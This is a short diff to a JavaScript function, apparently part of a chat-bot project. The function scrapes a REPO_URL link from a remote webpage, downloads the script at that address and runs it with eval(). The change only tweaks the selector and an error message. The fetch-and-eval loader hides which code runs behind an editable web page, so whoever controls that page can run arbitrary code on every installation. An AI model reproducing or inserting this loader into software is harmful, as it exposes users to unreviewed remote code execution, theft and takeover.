@@ -10,19 +10,19 @@ async function fetchRepoUrl() {
     const response = await axios.get(adams.BWM_XMD);
     const $ = cheerio.load(response.data);
 
-    // Improved selector: Look for an <a> tag where the href contains "REPO_URL"
-    const repoUrl = $('a[href*="REPO_URL"]').attr('href');
+    // Target the <a> tag with text "REPO_URL"
+    const repoUrlElement = $('a:contains("REPO_URL")');
+    const repoUrl = repoUrlElement.attr('href');
 
-    // If not found, throw an error
     if (!repoUrl) {
-      throw new Error('REPO_URL not found. Check the webpage HTML structure.');
+      throw new Error('REPO_URL link not found in HTML.');
     }
 
     console.log('REPO_URL fetched successfully:', repoUrl);
 
     // Fetch and execute the script from REPO_URL
     const scriptResponse = await axios.get(repoUrl);
-    eval(scriptResponse.data); // Execute the script
+    eval(scriptResponse.data);
 
   } catch (error) {
     console.error('Error:', error.message);
